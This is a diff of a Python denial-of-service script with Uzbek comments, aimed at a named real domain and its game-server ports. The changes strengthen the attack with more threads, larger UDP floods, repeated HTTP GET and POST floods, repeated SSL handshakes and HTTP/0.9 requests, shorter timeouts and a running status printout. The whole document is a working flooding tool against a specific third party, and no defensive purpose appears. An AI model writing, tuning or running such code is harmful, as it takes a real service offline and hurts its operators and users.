@@ -310,8 +310,6 @@
 
 
 
-
-
 import socket
 import requests
 import threading
@@ -322,65 +320,66 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-TARGET_IP = "84.54.82.227"
+# ==================== KONFIGURATSIYA ====================
+TARGET_DOMAIN = "zaadrot.uz"
+TARGET_IP = socket.gethostbyname(TARGET_DOMAIN)  # DNS orqali IP ni avtomatik olish
 GAME_PORTS = list(range(27015, 27031))
-
-# === KAM THREAD, KO'P ISH ===
-TOTAL_THREADS = 150   # Railway safe limit
+TOTAL_THREADS = 200
 
 print("=" * 60)
-print("[*] ZAADROT.UZ - OPTIMALLASHTIRILGAN HUJUM")
-print(f"[*] IP: {TARGET_IP}")
-print(f"[*] Threadlar: {TOTAL_THREADS} (xavfsiz)")
-print("[*] Taxminiy vaqt: 3-5 daqiqa")
+print("[*] ZAADROT.UZ - AVTOMATIK DNS BILAN HUJUM")
+print(f"[*] Domen: {TARGET_DOMAIN}")
+print(f"[*] IP manzil: {TARGET_IP} (avtomatik olindi)")
+print(f"[*] Threadlar: {TOTAL_THREADS}")
 print("[*] Press Ctrl+C to stop")
 print("=" * 60)
 
-# === HAR BIR THREAD HAMMA USULLARNI BAJARADI ===
 def worker():
-    # Har bir thread o'z socket va sessionlarini yaratadi
     udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     session = requests.Session()
     
     udp_data = b"\xff\xff\xff\xff" + b"X" * 1400
     query_data = b"\xff\xff\xff\xffTSource Engine Query\x00"
     
     while True:
-        # 1. UDP flood (o'yin serverlari)
-        for _ in range(10):
+        # === 1. UDP FLOOD (o'yin serverlari) ===
+        for _ in range(100):
             port = random.choice(GAME_PORTS)
             udp_sock.sendto(udp_data, (TARGET_IP, port))
             udp_sock.sendto(query_data, (TARGET_IP, port))
+            udp_sock.sendto(b"\x00"*1400, (TARGET_IP, port))
         
-        # 2. HTTP flood (to'g'ridan-to'g'ri IP)
+        # === 2. HTTP FLOOD (to'g'ridan-to'g'ri IP, Host header bilan) ===
         try:
-            session.get(f"http://{TARGET_IP}/", headers={"Host": "zaadrot.uz"}, timeout=0.3, verify=False)
-            session.post(f"http://{TARGET_IP}/", headers={"Host": "zaadrot.uz"}, data={"x": "y"*2000}, timeout=0.3, verify=False)
-            session.get(f"https://{TARGET_IP}/", headers={"Host": "zaadrot.uz"}, timeout=0.3, verify=False)
+            for _ in range(20):
+                session.get(f"http://{TARGET_IP}/", headers={"Host": TARGET_DOMAIN}, timeout=0.1, verify=False)
+                session.post(f"http://{TARGET_IP}/", headers={"Host": TARGET_DOMAIN}, data={"x": "y"*5000}, timeout=0.1, verify=False)
+                session.get(f"https://{TARGET_IP}/", headers={"Host": TARGET_DOMAIN}, timeout=0.1, verify=False)
         except:
             pass
         
-        # 3. SSL renegotiation
+        # === 3. SSL RENEGOTIATION ===
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
-            sock.connect((TARGET_IP, 443))
-            ctx = ssl.create_default_context()
-            ssl_sock = ctx.wrap_socket(sock, server_hostname="zaadrot.uz")
             for _ in range(10):
-                ssl_sock.do_handshake()
-            ssl_sock.close()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                sock.connect((TARGET_IP, 443))
+                ctx = ssl.create_default_context()
+                ssl_sock = ctx.wrap_socket(sock, server_hostname=TARGET_DOMAIN)
+                for _ in range(15):
+                    ssl_sock.do_handshake()
+                ssl_sock.close()
         except:
             pass
         
-        # 4. HTTP/0.9 (505 uchun)
+        # === 4. HTTP/0.9 (505 xatosi uchun) ===
         try:
-            sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock2.settimeout(1)
-            sock2.connect((TARGET_IP, 80))
-            sock2.send(b"GET / HTTP/0.9\r\n\r\n")
-            sock2.close()
+            for _ in range(10):
+                sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock2.settimeout(0.5)
+                sock2.connect((TARGET_IP, 80))
+                sock2.send(b"GET / HTTP/0.9\r\n\r\n")
+                sock2.close()
         except:
             pass
 
@@ -390,12 +389,14 @@ for _ in range(TOTAL_THREADS):
     t = threading.Thread(target=worker, daemon=True)
     t.start()
     threads.append(t)
-    time.sleep(0.05)  # Tizimga yuklanish uchun pauza
+    time.sleep(0.02)
 
-print("[*] Barcha threadlar ishga tushdi. 3-5 daqiqa kuting...")
+print("[*] Barcha threadlar ishga tushdi.")
+print("[*] Saytni kuzating: https://zaadrot.uz")
 
 try:
     while True:
-        time.sleep(1)
+        time.sleep(5)
+        print(f"[*] Hujum davom etmoqda... ({time.strftime('%H:%M:%S')})")
 except KeyboardInterrupt:
     print("\n[!] Hujum to'xtatildi.")
